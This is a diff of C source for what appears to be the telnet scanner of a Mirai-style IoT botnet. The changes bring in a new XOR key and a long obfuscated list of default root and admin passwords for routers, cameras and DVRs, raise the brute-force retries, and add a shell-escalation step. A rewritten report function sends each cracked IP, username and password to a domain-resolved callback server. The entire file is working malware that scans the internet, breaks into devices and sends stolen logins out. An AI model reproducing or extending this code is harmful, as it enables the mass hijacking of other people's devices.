@@ -1,4 +1,3 @@
-#ifdef SCANNER
 #define _GNU_SOURCE
 
 #ifdef DEBUG
@@ -80,7 +79,7 @@ void scanner_init(void)
     if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
-        printf("[telnet] Failed to initialize raw socket, cannot scan\n");
+        printf("(unstable/scanner) failed to initialize raw socket, cannot scan\n");
 #endif
         exit(0);
     }
@@ -89,7 +88,7 @@ void scanner_init(void)
     if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
     {
 #ifdef DEBUG
-        printf("[telnet] Failed to set IP_HDRINCL, cannot scan\n");
+        printf("(unstable/scanner) failed to set IP_HDRINCL, cannot scan\n");
 #endif
         close(rsck);
         exit(0);
@@ -118,33 +117,84 @@ void scanner_init(void)
     tcph->doff = 5;
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
-    
 
-    // 0x1337c0d3
-    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x53\x52\x51\x56\x42\x5B\x43", 15); // default:default
-    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "", 7); // default:
-    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59", 10); // admin:admin
-    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x05\x04\x03", 9); //admin:1234
-    add_auth_entry("\x53\x56\x52\x5A\x58\x59", "\x53\x56\x52\x5A\x58\x59", 12); // daemon:daemon
-    add_auth_entry("\x56\x53\x5A\x5E\x59", "", 5); // admin:
-    add_auth_entry("\x45\x58\x58\x43", "\x53\x52\x51\x56\x42\x5B\x43", 11); // root:default
-    add_auth_entry("\x45\x58\x58\x43", "\x41\x5E\x4D\x4F\x41", 9); // root:vizxv
-    add_auth_entry("\x55\x5E\x59", "", 3); // bin:
-    add_auth_entry("\x56\x53\x5A", "", 3); // adm:
-    add_auth_entry("\x45\x58\x58\x43", "\x45\x58\x58\x43", 8); // root:root
-    add_auth_entry("\x45\x58\x58\x43", "\x56\x53\x5A\x5E\x59", 9); // root:admin
-    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x05\x01\x07\x06\x5F\x4F", 11);  // admin:2601hx
-    add_auth_entry("\x45\x58\x58\x43", "\x06\x07\x07\x06\x54\x5F\x5E\x59", 12); // root:1001chin
-    add_auth_entry("\x45\x58\x58\x43", "\x73\x06\x04\x5F\x5F\x6C", 10); // root:D13hh[
-    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5B\x4F\x4F\x2\x37", 10); // root:zlxx.
-    add_auth_entry("\x45\x58\x58\x43", "\x4F\x54\x04\x02\x06\x06\x37", 11); // root:xc3511
-    add_auth_entry("\x45\x58\x58\x43", "\x02\x42\x47\x37", 8); // root:5up
- 
+    // Set up passwords
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x65\x5E\x7E\x44\x36\x37\x30\x3D\x31\x3C\x31\x3D", 10); // root taZz@23495859
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x77\x63\x6B\x6D\x6A\x63\x6B\x6A", 10); // root tsgoingon
+    add_auth_entry("\x76\x6B\x6B\x70", "\x77\x6B\x68\x6B\x6F\x61\x7D", 10); // root solokey
+    add_auth_entry("\x65\x60\x69\x6D\x6A", "\x65\x60\x69\x6D\x6A", 1); // admin admin
+    add_auth_entry("\x60\x61\x62\x65\x71\x68\x70", "\x60\x61\x62\x65\x71\x68\x70", 1); // default default
+    add_auth_entry("\x71\x77\x61\x76", "\x71\x77\x61\x76", 1); // user user
+    add_auth_entry("\x63\x71\x61\x77\x70", "\x63\x71\x61\x77\x70", 1); // guest guest
+    add_auth_entry("\x70\x61\x68\x6A\x61\x70\x65\x60\x69\x6D\x6A", "\x70\x61\x68\x6A\x61\x70\x65\x60\x69\x6D\x6A", 1); // telnetadmin telnetadmin
+  	add_auth_entry("\x76\x6B\x6B\x70", "\x35\x35\x35\x35", 1); // root 1111
+    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x36\x37\x30", 1); // root 1234
+    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x36\x37\x30\x31", 1); // root 12345
+    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x36\x37\x30\x31\x32", 1); // root 123456
+    add_auth_entry("\x76\x6B\x6B\x70", "\x31\x30\x37\x36\x35", 1); // root 54321
+    add_auth_entry("\x76\x6B\x6B\x70", "\x3C\x3C\x3C\x3C\x3C\x3C\x3C\x3C", 1); // root 88888888
+    add_auth_entry("\x76\x6B\x6B\x70", "\x36\x34\x34\x3C\x34\x3C\x36\x32", 1); // root 20080826
+    add_auth_entry("\x76\x6B\x6B\x70", "\x32\x32\x32\x32\x32\x32", 1); // root 666666
+    add_auth_entry("\x76\x6B\x6B\x70", "\x3C\x3C\x3C\x3C\x3C\x3C", 1); // root 888888
+    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x34\x34\x35\x67\x6C\x6D\x6A", 1); // root 1001chin
+    add_auth_entry("\x76\x6B\x6B\x70", "\x7C\x67\x37\x31\x35\x35", 1); // root xc3511
+    add_auth_entry("\x76\x6B\x6B\x70", "\x72\x6D\x7E\x7C\x72", 1); // root vizxv
+    add_auth_entry("\x76\x6B\x6B\x70", "\x31\x71\x74", 1); // root 5up
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6E\x72\x66\x7E\x60", 1); // root jvbzd
+    add_auth_entry("\x76\x6B\x6B\x70", "\x76\x6B\x6B\x70", 1); // root root
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x63\x36\x7C\x34", 1); // root hg2x0
+    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x60\x69\x6D\x6A", 1); // root admin
+    add_auth_entry("\x76\x6B\x6B\x70", "\x5E\x70\x61\x31\x36\x35", 1); // root Zte521
+    add_auth_entry("\x76\x6B\x6B\x70", "\x63\x76\x6B\x71\x70\x61\x76", 1); // root grouter
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x61\x68\x6A\x61\x70", 1); // root telnet
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6B\x61\x68\x6D\x6A\x71\x7C\x35\x36\x37", 1); // root oelinux123
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x68\x33\x3C\x3D", 1); // root tl789
+    add_auth_entry("\x76\x6B\x6B\x70", "\x43\x49\x3C\x35\x3C\x36", 1); // root GM8182
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x71\x6A\x70\x31\x33\x31\x3D", 1); // root hunt5759
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x61\x68\x61\x67\x6B\x69\x65\x60\x69\x6D\x6A", 1); // root telecomadmin
+    add_auth_entry("\x76\x6B\x6B\x70", "\x60\x61\x62\x65\x71\x68\x70", 1); // root default
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x73\x61\x3C\x61\x6C\x6B\x69\x61", 1); // root twe8ehome
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x37\x67", 1); // root h3c
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6A\x69\x63\x7C\x5B\x73\x65\x74\x6D\x65", 1); // root nmgx_wapia
+    add_auth_entry("\x76\x6B\x6B\x70", "\x74\x76\x6D\x72\x65\x70\x61", 1); // root private
+    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x66\x67\x35\x36\x37", 1); // root abc123
+    add_auth_entry("\x76\x6B\x6B\x70", "\x56\x4B\x4B\x50\x31\x34\x34", 1); // root ROOT500
+    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x6C\x61\x70\x7E\x6D\x74\x3C", 1); // root ahetzip8
+    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x6A\x6F\x6B", 1); // root anko
+    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x77\x67\x61\x6A\x60", 1); // root ascend
+    add_auth_entry("\x76\x6B\x6B\x70", "\x66\x68\x61\x6A\x60\x61\x76", 1); // root blender
+    add_auth_entry("\x76\x6B\x6B\x70", "\x67\x65\x70\x35\x34\x36\x3D", 1); // root cat1029
+    add_auth_entry("\x76\x6B\x6B\x70", "\x67\x6C\x65\x6A\x63\x61\x69\x61", 1); // root changeme
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6D\x40\x6D\x76\x61\x67\x70", 1); // root iDirect
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6A\x62\x68\x61\x67\x70\x6D\x6B\x6A", 1); // root inflection
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6D\x74\x67\x65\x69\x5B\x76\x70\x31\x37\x31\x34", 1); // root ipcam_rt5350
+    add_auth_entry("\x76\x6B\x6B\x70", "\x77\x73\x77\x66\x7E\x6F\x63\x6A", 1); // root swsbzkgn
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6E\x71\x65\x6A\x70\x61\x67\x6C", 1); // root juantech
+    add_auth_entry("\x76\x6B\x6B\x70", "\x74\x65\x77\x77", 1); // root pass
+    add_auth_entry("\x76\x6B\x6B\x70", "\x74\x65\x77\x77\x73\x6B\x76\x60", 1); // root password
+    add_auth_entry("\x76\x6B\x6B\x70", "\x77\x72\x63\x6B\x60\x6D\x61", 1); // root svgodie
+    add_auth_entry("\x76\x6B\x6B\x70", "\x70\x34\x70\x65\x68\x67\x34\x6A\x70\x76\x34\x68\x30\x25", 1); // root t0talc0ntr0l4!
+    add_auth_entry("\x76\x6B\x6B\x70", "\x7E\x6C\x6B\x6A\x63\x7C\x6D\x6A\x63", 1); // root zhongxing
+    add_auth_entry("\x76\x6B\x6B\x70", "\x7E\x68\x7C\x7C\x2A", 1); // root zlxx.
+    add_auth_entry("\x76\x6B\x6B\x70", "\x7E\x77\x71\x6A\x35\x35\x3C\x3C", 1); // root zsun1188
+    add_auth_entry("\x76\x6B\x6B\x70", "\x7C\x69\x6C\x60\x6D\x74\x67", 1); // root xmhdipc
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6F\x68\x72\x35\x36\x37", 1); // root klv123
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x6D\x37\x31\x35\x3C", 1); // root hi3518
+    add_auth_entry("\x76\x6B\x6B\x70", "\x33\x71\x6E\x49\x6F\x6B\x34\x72\x6D\x7E\x7C\x72", 1); // root 7ujMko0vizxv
+    add_auth_entry("\x76\x6B\x6B\x70", "\x33\x71\x6E\x49\x6F\x6B\x34\x65\x60\x69\x6D\x6A", 1); // root 7ujMko0admin
+    add_auth_entry("\x76\x6B\x6B\x70", "\x60\x76\x61\x65\x69\x66\x6B\x7C", 1); // root dreambox
+    add_auth_entry("\x76\x6B\x6B\x70", "\x77\x7D\x77\x70\x61\x69", 1); // root system
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6D\x73\x6F\x66", 1); // root ikwb
+    add_auth_entry("\x76\x6B\x6B\x70", "\x76\x61\x65\x68\x70\x61\x6F", 1); // root realtek
+    add_auth_entry("\x76\x6B\x6B\x70", "\x71\x77\x61\x76", 1); // root user
+    add_auth_entry("\x76\x6B\x6B\x70", "\x34\x34\x34\x34\x34\x34\x34\x34", 1); // root 00000000
+    add_auth_entry("\x76\x6B\x6B\x70", "\x35\x36\x37\x30\x35\x36\x37\x30", 1); // root 12341234
+    add_auth_entry("\x76\x6B\x6B\x70", "\x6C\x71\x6D\x63\x71\x37\x34\x3D", 1); // root huigu309
+    add_auth_entry("\x76\x6B\x6B\x70", "\x73\x6D\x6A\x35\x60\x6B\x73\x77", 1); // root win1dows
+    add_auth_entry("\x76\x6B\x6B\x70", "\x65\x6A\x70\x77\x68\x75", 1); // root antslq
 
-
-    
 #ifdef DEBUG
-    printf("[telnet] Scanner process initialized. Scanning started.\n");
+    printf("(unstable/scanner) scanner process initialized. scanning started\n");
 #endif
 
     // Main logic loop
@@ -172,14 +222,7 @@ void scanner_init(void)
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-                if (i % 10 == 0)
-                {
-                    tcph->dest = htons(2323);
-                }
-                else
-                {
-                    tcph->dest = htons(23);
-                }
+                tcph->dest = htons(23);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
                 tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
@@ -213,7 +256,7 @@ void scanner_init(void)
                 continue;
             if (iph->protocol != IPPROTO_TCP)
                 continue;
-            if (tcph->source != htons(23) && tcph->source != htons(2323))
+            if (tcph->source != htons(23))
                 continue;
             if (tcph->dest != source_port)
                 continue;
@@ -247,7 +290,7 @@ void scanner_init(void)
             conn->dst_port = tcph->source;
             setup_connection(conn);
 #ifdef DEBUG
-            printf("[telnet] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
+            printf("(unstable/scanner) FD%d attempting to brute found device %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
 #endif
         }
 
@@ -264,7 +307,7 @@ void scanner_init(void)
             if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
             {
 #ifdef DEBUG
-                printf("[telnet] FD%d timed out (state = %d)\n", conn->fd, conn->state);
+                printf("(unstable/scanner) FD%d timed out (state = %d)\n", conn->fd, conn->state);
 #endif
                 close(conn->fd);
                 conn->fd = -1;
@@ -272,7 +315,7 @@ void scanner_init(void)
                 // Retry
                 if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                 {
-                    if (++(conn->tries) == 10)
+                    if (++(conn->tries) == 30)
                     {
                         conn->tries = 0;
                         conn->state = SC_CLOSED;
@@ -281,7 +324,7 @@ void scanner_init(void)
                     {
                         setup_connection(conn);
 #ifdef DEBUG
-                        printf("[telnet] FD%d retrying with different auth combo!\n", conn->fd);
+                        printf("(unstable/scanner) FD%d retrying with different auth combo!\n", conn->fd);
 #endif
                     }
                 }
@@ -331,13 +374,13 @@ void scanner_init(void)
                     conn->auth = random_auth_entry();
                     conn->rdbuf_pos = 0;
 #ifdef DEBUG
-                    printf("[telnet] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
+                    printf("(unstable/scanner) FD%d connected. trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
 #endif
                 }
                 else
                 {
 #ifdef DEBUG
-                    printf("[telnet] FD%d error while connecting = %d\n", conn->fd, err);
+                    printf("(unstable/scanner) FD%d error while connecting = %d\n", conn->fd, err);
 #endif
                     close(conn->fd);
                     conn->fd = -1;
@@ -366,7 +409,7 @@ void scanner_init(void)
                     if (ret == 0)
                     {
 #ifdef DEBUG
-                        printf("[telnet] FD%d connection gracefully closed\n", conn->fd);
+                        printf("(unstable/scanner) FD%d connection gracefully closed\n", conn->fd);
 #endif
                         errno = ECONNRESET;
                         ret = -1; // Fall through to closing connection below
@@ -376,14 +419,13 @@ void scanner_init(void)
                         if (errno != EAGAIN && errno != EWOULDBLOCK)
                         {
 #ifdef DEBUG
-                            printf("[telnet] FD%d lost connection\n", conn->fd);
+                            printf("(unstable/scanner) FD%d lost connection\n", conn->fd);
 #endif
                             close(conn->fd);
                             conn->fd = -1;
 
                             // Retry
-                            if (++(conn->tries) >= 10)
-
+                            if (++(conn->tries) >= 30)
                             {
                                 conn->tries = 0;
                                 conn->state = SC_CLOSED;
@@ -392,7 +434,7 @@ void scanner_init(void)
                             {
                                 setup_connection(conn);
 #ifdef DEBUG
-                                printf("[telnet] FD%d retrying with different auth combo!\n", conn->fd);
+                                printf("(unstable/scanner) FD%d retrying with different auth combo!\n", conn->fd);
 #endif
                             }
                         }
@@ -412,7 +454,7 @@ void scanner_init(void)
                             {
                                 conn->state = SC_WAITING_USERNAME;
 #ifdef DEBUG
-                                printf("[telnet] FD%d finished telnet negotiation\n", conn->fd);
+                                printf("(unstable/scanner) FD%d finished telnet negotiation\n", conn->fd);
 #endif
                             }
                             break;
@@ -423,7 +465,7 @@ void scanner_init(void)
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 conn->state = SC_WAITING_PASSWORD;
 #ifdef DEBUG
-                                printf("[telnet] FD%d received username prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received username prompt\n", conn->fd);
 #endif
                             }
                             break;
@@ -431,7 +473,7 @@ void scanner_init(void)
                             if ((consumed = consume_pass_prompt(conn)) > 0)
                             {
 #ifdef DEBUG
-                                printf("[telnet] FD%d received password prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received password prompt\n", conn->fd);
 #endif
 
                                 // Send password
@@ -448,7 +490,7 @@ void scanner_init(void)
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[telnet] FD%d received shell prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received shell prompt\n", conn->fd);
 #endif
 
                                 // Send enable / system / shell / sh to session to drop into shell if needed
@@ -457,6 +499,25 @@ void scanner_init(void)
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_ENABLE);
+                                conn->state = SC_WAITING_LSHELL_RESP;
+                            }
+                            break;
+                        case SC_WAITING_LSHELL_RESP:
+                            if ((consumed = consume_any_prompt(conn)) > 0)
+                            {
+                                char *tmp_str;
+                                int tmp_len;
+
+#ifdef DEBUG
+                                printf("(unstable/scanner) FD%d received shell prompt\n", conn->fd);
+#endif
+
+                                // Send enable / system / shell / sh to session to drop into shell if needed
+                                table_unlock_val(TABLE_SCAN_LSHELL);
+                                tmp_str = table_retrieve_val(TABLE_SCAN_LSHELL, &tmp_len);
+                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                                table_lock_val(TABLE_SCAN_LSHELL);
                                 conn->state = SC_WAITING_ENABLE_RESP;
                             }
                             break;
@@ -467,7 +528,7 @@ void scanner_init(void)
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[telnet] FD%d received sh prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received sh prompt\n", conn->fd);
 #endif
 
                                 table_unlock_val(TABLE_SCAN_SYSTEM);
@@ -479,14 +540,14 @@ void scanner_init(void)
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
                             break;
-            case SC_WAITING_SYSTEM_RESP:
+			case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[telnet] FD%d received sh prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received sh prompt\n", conn->fd);
 #endif
 
                                 table_unlock_val(TABLE_SCAN_SHELL);
@@ -505,7 +566,7 @@ void scanner_init(void)
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[telnet] FD%d received enable prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received enable prompt\n", conn->fd);
 #endif
 
                                 table_unlock_val(TABLE_SCAN_SH);
@@ -524,7 +585,7 @@ void scanner_init(void)
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[telnet] FD%d received sh prompt\n", conn->fd);
+                                printf("(unstable/scanner) FD%d received sh prompt\n", conn->fd);
 #endif
 
                                 // Send query string
@@ -542,13 +603,13 @@ void scanner_init(void)
                             if (consumed == -1)
                             {
 #ifdef DEBUG
-                                printf("[telnet] FD%d invalid username/password combo\n", conn->fd);
+                                printf("(unstable/scanner) FD%d invalid username/password combo\n", conn->fd);
 #endif
                                 close(conn->fd);
                                 conn->fd = -1;
 
                                 // Retry
-                                if (++(conn->tries) >= 10)
+                                if (++(conn->tries) == 30)
                                 {
                                     conn->tries = 0;
                                     conn->state = SC_CLOSED;
@@ -557,7 +618,7 @@ void scanner_init(void)
                                 {
                                     setup_connection(conn);
 #ifdef DEBUG
-                                    printf("[telnet] FD%d retrying with different auth combo!\n", conn->fd);
+                                    printf("(unstable/scanner) FD%d retrying with different auth combo!\n", conn->fd);
 #endif
                                 }
                             }
@@ -566,7 +627,7 @@ void scanner_init(void)
                                 char *tmp_str;
                                 int tmp_len;
 #ifdef DEBUG
-                                printf("[telnet] FD%d Found verified working telnet\n", conn->fd);
+                                printf("(unstable/scanner) FD%d found verified working telnet\n", conn->fd);
 #endif
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                 close(conn->fd);
@@ -611,7 +672,7 @@ static void setup_connection(struct scanner_connection *conn)
     if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
 #ifdef DEBUG
-        printf("[telnet] Failed to call socket()\n");
+        printf("(unstable/scanner) failed to call socket()\n");
 #endif
         return;
     }
@@ -650,13 +711,13 @@ static ipv4_t get_random_ip(void)
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
           (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
           (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 22 && o2 == 168) ||               // 22.168.0.0/16   - Internal network
+          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
           (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
           (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
           (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-          (o1 == 28 && o2 >= 18 && o2 < 20) ||     // 28.18.0.0/15    - IANA Special use
-          (o1 >= 24) ||                            // 24.*.*.*+       - Multicast
-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 2 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
+          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
+          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
     );
 
     return INET_ADDR(o1,o2,o3,o4);
@@ -761,24 +822,24 @@ static int consume_user_prompt(struct scanner_connection *conn)
     if (prompt_ending == -1)
     {
         int tmp, len;
-        char *ogin, *enter;
-        
+		char *ogin, *enter;
+
         table_unlock_val(TABLE_SCAN_OGIN);
-        table_unlock_val(TABLE_SCAN_ENTER);
-        
-        ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
-        enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
-        
+		table_unlock_val(TABLE_SCAN_ENTER);
+
+		ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
+		enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
+
         if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, ogin, len - 1) != -1))
             prompt_ending = tmp;
-        
+
         else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, enter, len - 1) != -1))
             prompt_ending = tmp;
-        
+
     }
         table_lock_val(TABLE_SCAN_OGIN);
-        table_lock_val(TABLE_SCAN_ENTER);
-        
+		table_lock_val(TABLE_SCAN_ENTER);
+
     if (prompt_ending == -1)
         return 0;
     else
@@ -799,16 +860,20 @@ static int consume_pass_prompt(struct scanner_connection *conn)
         }
     }
 
-        if (prompt_ending == -1)
+    if (prompt_ending == -1)
     {
-        char *Josho_asswd;
-        int tmp, len;
-        table_unlock_val(TABLE_SCAN_ASSWORD);
-        Josho_asswd = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
-        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, Josho_asswd, len - 1) != -1))
+		int tmp, len;
+		char *assword;
+
+		table_unlock_val(TABLE_SCAN_ASSWORD);
+
+		assword = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
+
+        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, assword, len - 1) != -1))
             prompt_ending = tmp;
     }
-        table_lock_val(TABLE_SCAN_ASSWORD);
+		table_lock_val(TABLE_SCAN_ASSWORD);
+
     if (prompt_ending == -1)
         return 0;
     else
@@ -874,6 +939,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 {
     struct sockaddr_in addr;
     int pid = fork(), fd;
+    struct resolv_entries *entries = NULL;
 
     if (pid > 0 || pid == -1)
         return;
@@ -881,21 +947,32 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
 #ifdef DEBUG
-        printf("[report] Failed to call socket()\n");
+        printf("(unstable/scanner/report) failed to call socket()\n");
 #endif
         exit(0);
     }
-    
-    table_unlock_val(TABLE_SCAN_CB_PORT);
+
+    table_unlock_val(TABLE_SCAN_DOMAIN);
+
+    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_DOMAIN, NULL));
+    if (entries == NULL)
+    {
+#ifdef DEBUG
+        printf("(unstable/scanner/report) failed to resolve report address\n");
+#endif
+        return;
+    }
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = INET_ADDR(0,0,0,0);     //Change this to your server IP
-    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
-    table_lock_val(TABLE_SCAN_CB_PORT);
+    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    addr.sin_port = htons(24529);
+    resolv_entries_free(entries);
+
+    table_lock_val(TABLE_SCAN_DOMAIN);
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
     {
 #ifdef DEBUG
-        printf("[report] Failed to connect to scanner callback!\n");
+        printf("(unstable/scanner/report) failed to connect to scanner callback!\n");
 #endif
         close(fd);
         exit(0);
@@ -911,7 +988,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
 
 #ifdef DEBUG
-    printf("[report] Send scan result to loader\n");
+    printf("(unstable/scanner/report) sent scan result to scanlisten\n");
 #endif
 
     close(fd);
@@ -930,10 +1007,10 @@ static char *deobf(char *str, int *len)
 
     for (i = 0; i < *len; i++)
     {
-        cpy[i] ^= 0x13;
-        cpy[i] ^= 0x37;
-        cpy[i] ^= 0xC0;
-        cpy[i] ^= 0xD3;
+        cpy[i] ^= 0xde;
+        cpy[i] ^= 0xad;
+        cpy[i] ^= 0xda;
+        cpy[i] ^= 0xad;
     }
 
     return cpy;
@@ -945,5 +1022,3 @@ static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amoun
 
     return ptr + amount < end;
 }
-
-#endif
